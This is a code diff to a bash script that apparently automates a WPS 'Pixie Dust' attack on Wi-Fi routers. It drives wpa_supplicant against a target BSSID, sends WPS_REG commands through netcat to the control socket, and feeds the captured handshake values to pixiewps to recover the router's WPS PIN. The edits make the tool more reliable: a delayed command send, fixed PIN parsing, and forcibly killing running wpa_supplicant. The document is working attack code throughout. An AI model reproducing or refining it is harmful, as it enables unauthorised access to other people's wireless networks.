@@ -2,14 +2,16 @@
 
 TEMPDIR=$(mktemp -d)
 TEMPFILE=$(mktemp --suffix=.conf)
-FIFO=$(mktemp -u)
+FIFO=$(mktemp -u --suffix=.pipe)
 mkfifo $FIFO
+
 
 BSSID=$1
 PIN=$2
 IFACE=$3
 PIXIE=1
-
+SOCKET=$TEMPDIR/$IFACE
+echo $SOCKET
 function quit() 
 {
 	rm -rf $TEMPDIR $TEMPFILE $FIFO
@@ -34,7 +36,7 @@ function pixie()
 	then
 		PIN=$(pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force |\
 			grep 'WPS pin' |\
-			cut -d : -f 2)
+			awk '{print $3}')
 		PIXIE_STATUS=SUCCESS
 	else
 		PIXIE_STATUS=FAIL
@@ -44,11 +46,12 @@ function pixie()
 
 function attack()
 {
+	killall -9 wpa_supplicant
 	printI "Launching wpa_supplicant"
 	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &
 	#Send WPS_REG command to wpa_supplicant socket
 	printI "Sending WPS_REG command to wpa_supplicant"
-	sendCMD
+	sleep 5 && sendCMD &
 
 	#Launch wpa_supplicant & parse output
 	while IFS= read -r LINE
@@ -141,7 +144,7 @@ function attack()
 
 function sendCMD()
 {
-	echo -n "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &
+	echo -n "WPS_REG $BSSID $PIN" | nc -u -U "$SOCKET" 
 	printI "Trying pin: $PIN"
 }
 function gethex()
